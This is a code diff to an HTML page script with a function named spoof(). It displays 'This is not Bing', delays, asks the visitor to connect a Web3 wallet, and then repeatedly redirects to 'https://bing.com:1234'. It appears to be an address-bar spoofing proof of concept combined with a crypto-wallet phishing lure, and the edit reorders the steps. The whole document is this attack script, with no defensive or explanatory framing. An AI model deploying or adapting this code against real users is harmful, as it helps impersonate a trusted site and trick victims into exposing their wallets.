@@ -6,24 +6,29 @@
 <body>
 <script>
   async function spoof() {
-    // Check if Web3 is available
-    if (typeof window.ethereum !== 'undefined') {
-      try {
-        // Prompt the user to connect their wallet
-        await window.ethereum.request({ method: 'eth_requestAccounts' });
-        
-        // Wallet connection successful, redirect to the spoofed URL
-        document.write("<h1>This is not Bing</h1>");
-        document.location = "https://bing.com:1234";
-        setInterval(function(){document.location="https://bing.com:1234";}, 9800);
-      } catch (error) {
-        // User rejected the connection request or some error occurred
-        console.error('Wallet connection failed:', error);
+    // Display the spoofed content
+    document.write("<h1>This is not Bing</h1>");
+
+    // Delay the wallet connection prompt by 2 seconds (adjust this value as needed)
+    setTimeout(async function() {
+      // Check if Web3 is available
+      if (typeof window.ethereum !== 'undefined') {
+        try {
+          // Prompt the user to connect their wallet
+          await window.ethereum.request({ method: 'eth_requestAccounts' });
+
+          // Wallet connection successful, redirect to the spoofed URL
+          document.location = "https://bing.com:1234";
+          setInterval(function(){document.location="https://bing.com:1234";}, 9800);
+        } catch (error) {
+          // User rejected the connection request or some error occurred
+          console.error('Wallet connection failed:', error);
+        }
+      } else {
+        // Web3 not available, display a message or redirect to a different page
+        alert('Web3 not available. Please use a Web3-enabled browser and try again.');
       }
-    } else {
-      // Web3 not available, display a message or redirect to a different page
-      alert('Web3 not available. Please use a Web3-enabled browser and try again.');
-    }
+    }, 2000); // Adjust the delay (in milliseconds) as needed
   };
 </script>
 
